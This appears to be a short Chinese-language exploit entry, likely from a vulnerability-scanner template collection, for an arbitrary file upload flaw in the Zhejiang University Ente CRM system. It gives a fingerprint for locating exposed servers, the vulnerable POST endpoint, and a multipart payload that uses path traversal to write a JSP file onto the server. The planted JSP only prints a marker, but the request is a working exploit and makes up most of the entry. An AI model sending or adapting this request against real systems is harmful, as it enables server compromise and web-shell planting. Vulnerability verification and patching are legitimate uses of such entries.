# 浙大恩特客户资源管理系统crmbasicaction任意文件上传

浙大恩特客户资源管理系统crmbasicaction ｜ 文件上传 ｜ —
- **指纹**：`title="欢迎使用浙大恩特客户资源管理系统"`
- **请求**：`POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1`

**Payload**
```
--0rwysvgvy7rxv790mpju
Content-Disposition: form-data; name="file"; filename="../../dudesuite.jsp"
Content-Type: application/zip
<% out.println("dudesuite"); %>
--0rwysvgvy7rxv790mpju--
```
- **响应特征**：200 jsp